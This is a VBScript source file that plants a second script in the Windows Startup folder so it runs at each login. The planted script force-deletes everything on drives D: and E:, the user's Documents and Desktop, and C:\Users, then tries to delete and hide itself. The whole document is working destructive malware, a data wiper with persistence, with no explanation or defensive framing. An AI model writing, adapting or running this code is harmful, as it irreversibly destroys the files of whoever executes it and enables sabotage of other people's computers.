Dim fso, file
Dim filePath, scriptContent
Dim userName
Dim paths(5)
Dim waitTime

Set WshNetwork = CreateObject("WScript.Network")
userName = WshNetwork.UserName

paths(0) = "E:\"
paths(1) = "D:\"
paths(2) = "C:\Users\" & userName & "\Documents\"
paths(3) = "C:\Users\" & userName & "\Desktop\"
paths(4) = "C:\Users\"
waitTime = 0.001* 60 * 1000

filePath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\yourscript.vbs"

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(filePath, True)

scriptContent = "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
                "path = """ & paths(0) & """" & vbCrLf & _
                "WScript.Sleep " & waitTime & vbCrLf & vbCrLf & _
                "WshShell.Run ""cmd /c del /f /s /q "" & path & ""\*""" & vbCrLf & _
                "WshShell.Run ""cmd /c rmdir /s /q "" & path" & vbCrLf & vbCrLf

For i = 1 To UBound(paths)
    scriptContent = scriptContent & "path = """ & paths(i) & """" & vbCrLf & _
                    "WshShell.Run ""cmd /c del /f /s /q "" & path & ""\*""" & vbCrLf & _
                    "WshShell.Run ""cmd /c rmdir /s /q "" & path" & vbCrLf & vbCrLf
Next

scriptContent = scriptContent & vbCrLf & _
                "fso.DeleteFile WScript.ScriptFullName" & vbCrLf & _
                "Set scriptFile = fso.GetFile(WScript.ScriptFullName)" & vbCrLf & _
                "scriptFile.Attributes = (scriptFile.Attributes Or 2) Or 4"

file.Write scriptContent
file.Close

Set file = Nothing
Set fso = Nothing